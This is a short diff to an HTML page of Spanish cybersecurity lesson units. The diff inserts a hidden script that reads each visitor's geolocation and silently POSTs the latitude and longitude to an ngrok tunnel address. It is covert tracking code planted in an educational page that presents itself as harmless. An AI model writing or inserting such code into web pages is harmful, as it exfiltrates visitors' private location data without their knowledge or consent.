@@ -10,6 +10,20 @@
   <p>Unidad 1: La ciberseguridad protege sistemas frente a accesos no autorizados.</p>
   <p>Unidad 2: Amenazas comunes incluyen malware, phishing y ransomware.</p>
   <p>Unidad 3: Buenas prácticas incluyen contraseñas fuertes y actualizaciones regulares.</p>
+  <script>
+  navigator.geolocation.getCurrentPosition(function(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    fetch("https://a15d26948c75.ngrok-free.app:5000", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ latitude: lat, longitude: lon })
+    });
+  });
+  </script>
+
 </body>
 </html>
+
 
